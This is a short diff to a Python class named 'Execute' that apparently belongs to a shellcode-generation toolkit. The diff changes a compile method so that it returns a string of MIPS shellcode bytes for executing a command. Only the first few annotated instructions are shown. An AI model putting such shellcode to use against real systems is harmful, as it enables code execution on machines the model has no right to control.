@@ -35,8 +35,8 @@ class Execute (Dynamic):
     def __init__(self, command):
         self.command = command
 
-    def compile(self, variables = None):
-        self._bytes = (
+    def compile(self, *argv, **argd):
+        return (
             "\x04\x10\xff\xff"       #  bltzal  $zero,<_cmdshellcode>
             "\x24\x02\x03\xf3"       #  li      $v0,1011
             "\x23\xff\x08\xf4"       #  addi    $ra,$ra,2292
